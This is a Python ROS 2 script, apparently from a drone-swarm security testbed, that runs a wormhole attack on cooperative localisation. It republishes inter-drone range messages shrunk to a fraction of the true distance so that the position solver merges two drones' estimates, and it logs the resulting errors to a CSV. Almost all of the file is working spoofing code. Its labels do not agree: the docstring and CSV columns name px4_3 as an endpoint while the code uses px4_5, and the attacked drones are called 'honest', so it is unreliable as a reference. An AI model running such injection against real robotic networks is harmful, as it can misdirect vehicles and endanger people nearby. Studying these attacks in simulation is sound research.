#!/usr/bin/env python3
"""
Wormhole attack on cooperative localisation
============================================
Tunnels range measurements between px4_1 and px4_3 (the two farthest
drones, 2m apart) and republishes with a shrunken range vector, making
them appear nearly adjacent. WLS solver collapses their estimates together.

Run:
    ros2 run swarm_discovery wormhole_attack
    ros2 run swarm_discovery wormhole_attack 0.05   # 5% of true distance

STRIDE: Tampering, Elevation of Privilege
Reference: Hu, Perrig & Johnson, IEEE JSAC 2006
"""
import sys, csv, time
import numpy as np
import rclpy
from rclpy.node import Node
from geometry_msgs.msg import PoseStamped, PointStamped

ENDPOINT_A    = "px4_1"
ENDPOINT_B    = "px4_5"
HONEST_DRONES = ["px4_1", "px4_5"]
ALL_DRONES    = ["px4_1", "px4_2", "px4_3", "px4_4", "px4_5"]
WORMHOLE_SCALE = 0.05
WARMUP_SEC     = 5.0
ATTACK_SEC     = 90.0
PUBLISH_HZ     = 25.0
LOG_FILE       = "/tmp/wormhole_attack_metrics.csv"


class WormholeAttack(Node):
    def __init__(self, scale):
        super().__init__("wormhole_attack")
        self.scale      = scale
        self.start_time = time.monotonic()
        self._latest    = {
            (ENDPOINT_A, ENDPOINT_B): None,
            (ENDPOINT_B, ENDPOINT_A): None,
        }
        self.est = {d: None for d in HONEST_DRONES}
        self.gt  = {d: None for d in ALL_DRONES}

        # Subscribe to the two bridged range topics
        self.create_subscription(PointStamped,
            f"/{ENDPOINT_A}/coop/range_to/{ENDPOINT_B}",
            lambda msg: self._on_range(ENDPOINT_A, ENDPOINT_B, msg), 10)
        self.create_subscription(PointStamped,
            f"/{ENDPOINT_B}/coop/range_to/{ENDPOINT_A}",
            lambda msg: self._on_range(ENDPOINT_B, ENDPOINT_A, msg), 10)

        # Ground truth + estimates
        for drone in ALL_DRONES:
            self.create_subscription(PoseStamped,
                f"/sim/ground_truth/{drone}/pose",
                lambda msg, d=drone: self.gt.update({d: np.array([
                    msg.pose.position.x, msg.pose.position.y, msg.pose.position.z])}), 10)
        for drone in HONEST_DRONES:
            self.create_subscription(PoseStamped,
                f"/{drone}/coop/self_estimate",
                lambda msg, d=drone: self.est.update({d: np.array([
                    msg.pose.position.x, msg.pose.position.y, msg.pose.position.z])}), 10)

        # Wormhole publishers — same topics, shrunken vectors
        self._wh_pubs = {
            (ENDPOINT_A, ENDPOINT_B): self.create_publisher(
                PointStamped, f"/{ENDPOINT_A}/coop/range_to/{ENDPOINT_B}", 10),
            (ENDPOINT_B, ENDPOINT_A): self.create_publisher(
                PointStamped, f"/{ENDPOINT_B}/coop/range_to/{ENDPOINT_A}", 10),
        }

        # CSV
        self._csv_file = open(LOG_FILE, "w", newline="")
        self._csv = csv.writer(self._csv_file)
        self._csv.writerow([
            "t_s", "phase", "scale",
            "true_dist_m", "reported_dist_m",
            "px4_1_est_x", "px4_1_est_y", "px4_1_est_z",
            "px4_1_gt_x",  "px4_1_gt_y",  "px4_1_gt_z", "px4_1_error_m",
            "px4_3_est_x", "px4_3_est_y", "px4_3_est_z",
            "px4_3_gt_x",  "px4_3_gt_y",  "px4_3_gt_z", "px4_3_error_m",
            "est_separation_m",
        ])

        self.create_timer(1.0 / PUBLISH_HZ, self._tick)
        self.get_logger().warn(
            f"[WORMHOLE] {ENDPOINT_A}↔{ENDPOINT_B} scale={scale} "
            f"(reports {scale*100:.0f}% of true distance)")

    def _on_range(self, observer, observed, msg):
        self._latest[(observer, observed)] = msg

    def _tick(self):
        elapsed   = time.monotonic() - self.start_time
        phase     = "warmup" if elapsed < WARMUP_SEC else "attack"
        true_dist = 0.0
        rep_dist  = 0.0

        if elapsed > ATTACK_SEC:
            self.get_logger().info("[WORMHOLE] Complete.")
            self._csv_file.flush(); self._csv_file.close()
            self.destroy_node(); return

        if phase == "attack":
            for (obs, obsd), msg in self._latest.items():
                if msg is None:
                    continue
                true_vec  = np.array([msg.point.x, msg.point.y, msg.point.z])
                true_norm = np.linalg.norm(true_vec)
                if true_norm < 1e-6:
                    continue
                fake_vec = true_vec * self.scale
                wh = PointStamped()
                wh.header.stamp    = self.get_clock().now().to_msg()
                wh.header.frame_id = "world"
                wh.point.x = float(fake_vec[0])
                wh.point.y = float(fake_vec[1])
                wh.point.z = float(fake_vec[2])
                self._wh_pubs[(obs, obsd)].publish(wh)
                if obs == ENDPOINT_A:
                    true_dist = true_norm
                    rep_dist  = true_norm * self.scale

        est_sep = 0.0
        if self.est[ENDPOINT_A] is not None and self.est[ENDPOINT_B] is not None:
            est_sep = float(np.linalg.norm(
                self.est[ENDPOINT_A] - self.est[ENDPOINT_B]))

        row = [f"{elapsed:.3f}", phase, f"{self.scale:.3f}",
               f"{true_dist:.4f}", f"{rep_dist:.4f}"]
        for drone in HONEST_DRONES:
            est, gt = self.est.get(drone), self.gt.get(drone)
            if est is not None and gt is not None:
                err = float(np.linalg.norm(est - gt))
                row += [f"{est[0]:.4f}", f"{est[1]:.4f}", f"{est[2]:.4f}",
                        f"{gt[0]:.4f}",  f"{gt[1]:.4f}",  f"{gt[2]:.4f}", f"{err:.4f}"]
            else:
                row += [""] * 7
        row.append(f"{est_sep:.4f}")
        self._csv.writerow(row)

        if int(elapsed) % 10 == 0 and int(elapsed * PUBLISH_HZ) % int(PUBLISH_HZ) == 0:
            self.get_logger().warn(
                f"[WORMHOLE t={elapsed:.0f}s phase={phase}] "
                f"true={true_dist:.3f}m reported={rep_dist:.3f}m "
                f"est_sep={est_sep:.3f}m")


def main():
    scale = float(sys.argv[1]) if len(sys.argv) > 1 else WORMHOLE_SCALE
    rclpy.init()
    node = WormholeAttack(scale)
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    finally:
        rclpy.shutdown()

if __name__ == "__main__":
    main()
